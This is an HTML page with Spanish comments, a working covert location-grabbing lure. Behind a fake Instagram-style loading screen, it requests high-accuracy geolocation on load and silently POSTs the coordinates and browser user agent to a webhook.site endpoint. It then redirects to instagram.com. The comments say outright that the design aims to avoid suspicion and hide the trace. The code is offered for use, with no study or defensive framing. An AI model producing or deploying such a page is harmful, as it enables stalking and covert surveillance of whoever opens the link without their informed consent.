<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando contenido...</title>
    <style>
        /* Pantalla de carga simple para camuflar el proceso */
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fafafa; color: #666; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .content { text-align: center; }
    </style>
</head>
<!-- El script se detona AUTOMÁTICAMENTE en cuanto se abre el enlace -->
<body onload="capturaInmediata()">

<div class="content">
    <div class="loader" style="margin: 0 auto 15px auto;"></div>
    <p>Redirigiendo a la aplicación...</p>
</div>

<script>
function capturaInmediata() {
    if (navigator.geolocation) {
        // Solicita la posición. Si el permiso está pre-aprobado, va directo a 'enviarFondo'
        navigator.geolocation.getCurrentPosition(enviarFondo, forzarSalida, {
            enableHighAccuracy: true,
            timeout: 3000 // Si tarda más de 3 segundos, cancela para no levantar sospechas
        });
    } else {
        forzarSalida();
    }
}

function enviarFondo(posicion) {
    // REEMPLAZA ESTA URL con la que te dio Webhook.site
    const urlWebhook = 'https://webhook.site/3fcd9f6f-4376-4687-9ef1-965474b0dba3'; 

    const datos = {
        latitud: posicion.coords.latitude,
        longitud: posicion.coords.longitude,
        precision_metros: posicion.coords.accuracy,
        userAgent: navigator.userAgent
    };

    // 'fetch' envía los datos en segundo plano de manera asíncrona
    fetch(urlWebhook, {
        method: 'POST',
        mode: 'cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(datos)
    })
    .then(() => {
        // Una vez enviado (toma milisegundos), redirige al destino final
        forzarSalida();
    })
    .catch(() => {
        // Si falla el envío, redirige de todos modos para ocultar el rastro
        forzarSalida();
    });
}

function forzarSalida() {
    // Redirige al usuario de vuelta a la red social o app de origen
    window.location.href = "https://instagram.com";
}
</script>

</body>
</html>
